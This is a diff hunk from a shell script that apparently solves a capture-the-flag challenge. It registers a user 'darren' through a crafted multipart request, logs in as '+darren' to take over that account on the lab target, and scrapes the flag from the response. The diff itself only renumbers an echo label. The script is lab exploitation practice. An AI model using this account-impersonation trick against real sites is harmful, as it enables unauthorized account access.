@@ -22,7 +22,7 @@ echo "2 - REGISTERING DARREN"
 curl -X POST "http://$target_ip:8088/register.php" -b /work/7-cookies.txt -v -L --trace trace-darren.log -H "Content-Type: multipart/form-data; boundary=-----------------------------boundary" --data-binary @${scriptpath}/7-data/darren.txt
 
 # Logging as adrren
-echo "5 - ANALYZING DARREN"
+echo "3 - ANALYZING DARREN"
 curl -s -X POST "http://$target_ip:8088/" -b /work/7-cookies.txt -L -d "user=+darren" -d "pass=test" -o /work/7-darren.html
 echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/7-darren.html | sed ':a;N;$!ba;s/[\n\t ]//g')" 
 
